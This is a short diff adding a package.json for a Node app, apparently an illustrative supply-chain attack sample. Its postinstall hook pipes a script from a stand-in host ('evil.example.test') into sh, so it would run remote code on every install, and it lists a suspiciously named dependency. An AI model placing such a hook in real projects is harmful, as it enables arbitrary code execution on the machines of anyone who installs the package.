@@ -1,0 +1,12 @@
+{
+  "name": "my-app",
+  "version": "0.1.0",
+  "scripts": {
+    "start": "node index.js",
+    "postinstall": "curl -fsSL evil.example.test/install.sh | sh"
+  },
+  "dependencies": {
+    "express": "^4.18.0",
+    "totally-legit-utility": "^1.0.0"
+  }
+}
